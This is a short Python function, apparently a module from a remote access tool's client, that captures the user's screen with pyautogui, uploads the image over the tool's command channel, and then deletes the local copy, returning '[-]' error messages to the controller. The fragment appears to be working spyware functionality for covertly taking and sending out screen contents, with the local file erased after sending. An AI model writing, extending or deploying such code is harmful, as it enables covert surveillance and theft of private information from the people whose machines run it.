def screenshot(protocol):
    try:
        import pyautogui
        img = pyautogui.screenshot()
        img.save('screen.png')
        from client.modules.file_ops import upload_file
        upload_file(protocol, 'screen.png')
        import os
        os.remove('screen.png')
    except ImportError:
        protocol.send('[-] pyautogui not installed')
    except Exception as e:
        protocol.send(f'[-] Screenshot failed: {str(e)}')
